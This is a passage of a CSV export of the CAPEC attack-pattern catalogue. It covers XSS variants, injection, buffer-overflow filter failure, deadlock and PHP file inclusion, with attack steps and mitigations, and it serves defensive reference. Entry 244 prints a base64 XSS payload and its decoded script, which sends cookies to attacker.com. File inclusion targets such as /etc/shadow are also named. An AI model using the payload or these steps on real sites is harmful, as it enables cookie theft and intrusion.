language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:480::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.:TECHNIQUE:The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.::STEP:2:PHASE:Explore:DESCRIPTION:[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.:TECHNIQUE:The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.:TECHNIQUE:The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.:TECHNIQUE:The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries.::\",\"\",\"::SKILL:The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::\",\"::Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.::Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.::Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.::Configuration: Get latest updates for the computer.::\",\"::Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named msits.exe, located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.::\",\"::693::\",\"\",\"\",\n24,\"Filter Failure through Buffer Overflow\",Detailed,Draft,\"In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for inputs that involve potential filtering:TECHNIQUE:Brute force guessing of filtered inputs::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.:TECHNIQUE:Brute force attack through black box penetration test tool.:TECHNIQUE:Fuzzing of communications protocols:TECHNIQUE:Manual testing of possible inputs with attack data.::STEP:3:PHASE:Experiment:DESCRIPTION:[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?:TECHNIQUE:Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.:TECHNIQUE:Check Log files. An attacker with access to log files can look at the outcome of bad input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.:TECHNIQUE:DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.:TECHNIQUE:Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.:TECHNIQUE:An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.::\",\"::Ability to control the length of data passed to an active filter.::\",\"::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"::Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.::Pre-design: Use a language or compiler that performs automatic bounds checking.::Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.::\",\"::Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.::A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.::Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.::\",\"::120::119::118::74::20::680::733::697::\",\"\",\"\",\n240,\"Resource Injection\",Meta,Stable,\"An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.\",\"\",High,High,\"\",\"\",\"::The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::\",\"\",\"::99::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Resource Injection::\",\"\",\n242,\"Code Injection\",Meta,Stable,\"An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.\",\"\",High,High,\"\",\"\",\"::The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.::\",\"::Utilize strict type, character, and encoding enforcement::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::\",\"\",\"::94::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Code Injection::\",\"\",\n243,\"XSS Targeting HTML Attributes\",Detailed,Draft,\"An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS targeting HTML attributes] The adversary uses the entry points gathered in the Explore phase as a target list and injects various malicious expressions as input, hoping to embed them as HTML attributes.:TECHNIQUE:Inject single and double quotes into URL parameters or other inputs to see if they are filtered out. Also use URL encoding to bypass filters.:TECHNIQUE:Use single or double quotes to close attribute evaluation and enter a new attribute that contains an expression.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.::\",\"\",\"::The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::\",\"\",\"\",\"::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for all input including that which is not expected to have any scripting content.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::\",\"\",\"::83::\",\"\",\"\",\n244,\"XSS Targeting URI Placeholders\",Detailed,Draft,\"An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for reflected XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads formatted as data URI schemes using base to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious payload formatted as a URI scheme, or use the URL returned when the URI scheme was given as input to the web application.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.::\",\"::SKILL:To inject the malicious payload in a web page:LEVEL:Medium::\",\"::Ability to send HTTP request to a web application::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::\",\"::The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An adversary could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.::\",\"::83::\",\"\",\"\","
  },
  "doc-57754af8d2b81c2821e50f0d8701974d": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n245,\"XSS Using Doubled Characters\",Detailed,Draft,\"The adversary bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the adversary can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS using double characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads modified to use double characters and doubled special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Use a list of XSS probe strings using double characters to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of doubled HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.::\",\"\",\"::The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::\",\"\",\"\",\"::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and sanitize all user supplied fields.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::\",\"\",\"::85::\",\"\",\"\",\n247,\"XSS Using Invalid Characters\",Detailed,Draft,\"An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the adversary to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerabilities using invalid characters] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads and special characters preceded by an invalid character(s) to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. The adversary is looking for cases where an invalid character causes an input filter to stop processing, allowing the malicious input that follows to bypass the filter:TECHNIQUE:Use a list of XSS probe strings preceded by an invalid character(s) such as null, carriage return, line feed, or tab to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.:TECHNIQUE:Use a list of HTML special characters preceded by an invalid character(s) to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag preceded by invalid character(s).:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for any input that will be included in any subsequent web pages or back end operations.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::\",\"\",\"::86::\",\"\",\"\",\n248,\"Command Injection\",Meta,Stable,\"An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.\",\"\",Medium,High,\"\",\"\",\"::The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.::\",\"::All user-controllable input should be validated and filtered for potentially unwanted characters. Using an allowlist for input is desired, but if use of a denylist approach is necessary, then focusing on command related terms and delimiters is necessary.::Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.::Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.::\",\"\",\"::77::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Command Injection::\",\"\",\n25,\"Forced Deadlock\",Meta,Stable,\"The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.\",\"\",Low,High,\"\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary initiates an exploratory phase to get familiar with the system.::STEP:2:PHASE:Explore:DESCRIPTION:The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.::STEP:3:PHASE:Explore:DESCRIPTION:If the target program has a deadlock condition, the program waits indefinitely resulting in a denial of service.::\",\"::The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [REF-101]::The target host exposes an API to the user.::\",\"::SKILL:This type of attack may be sophisticated and require knowledge about the system's resources and APIs.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.::\",\"::Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).::For competing actions, use well-known libraries which implement synchronization.::\",\"::An example of a deadlock which may occur in database products is the following. Client applications using the database may require exclusive access to a table, and in order to gain exclusive access they ask for a lock. If one client application holds a lock on a table and attempts to obtain the lock on a second table that is already held by a second client application, this may lead to deadlock if the second application then attempts to obtain the lock that is held by the first application (Source: Wikipedia, http://en.wikipedia.org/wiki/Deadlock)::\",\"::412::567::662::667::833::1322::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.004:ENTRY NAME:Endpoint Denial of Service: Application or System Exploitation::\",\"\",\n250,\"XML Injection\",Standard,Draft,\"An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.\",\"\",High,,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the Target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XML queries:TECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XML queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the Structure of Queries] Using manual or automated means, test inputs found for XML weaknesses.:TECHNIQUE:Use XML reserved characters or words, possibly with other input data to attempt to cause unexpected results and identify improper input validation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject Content into XML Queries] Craft malicious content containing XML expressions that is not validated by the application and is executed as part of the XML queries.:TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.::\",\"::XML queries used to process user input and retrieve information stored in XML documents::User-controllable input not properly sanitized::\",\"::SKILL:An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::Too many exceptions generated by the application as a result of malformed queries::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::\",\"::Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.::\",\"::91::74::20::707::\",\"TAXONOMY NAME:WASC:ENTRY ID:23:ENTRY NAME:XML Injection::\",\"\",\n251,\"Local Code Inclusion\",Standard,Stable,\"The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:175::\",\"\",\"::The targeted application must have a bug that allows an adversary to control which code file is loaded at some juncture.::Some variants of this attack may require that old versions of some code files be present and in predictable locations.::\",\"\",\"::The adversary needs to have enough access to the target application to control the identity of a locally included file. The attacker may also need to be able to upload arbitrary code files to the target machine, although any location for these files may be acceptable.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Through local code inclusion, the adversary compromises the integrity of the application.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.::\",\"::Implementation: Avoid passing user input to filesystem or framework API. If necessary to do so, implement a specific, allowlist approach.::\",\"\",\"::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055:ENTRY NAME:Process Injection::\",\"\",\n252,\"PHP Local File Inclusion\",Detailed,Draft,\"The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:251::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like http://vulnerable-website/file.php?file=index.php.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.:TECHNIQUE:Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.:TECHNIQUE:Use a proxy tool to record results of manual input of local file inclusion probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as /etc/passwd, /etc/shadow, or configuration files for the application that might expose sensitive 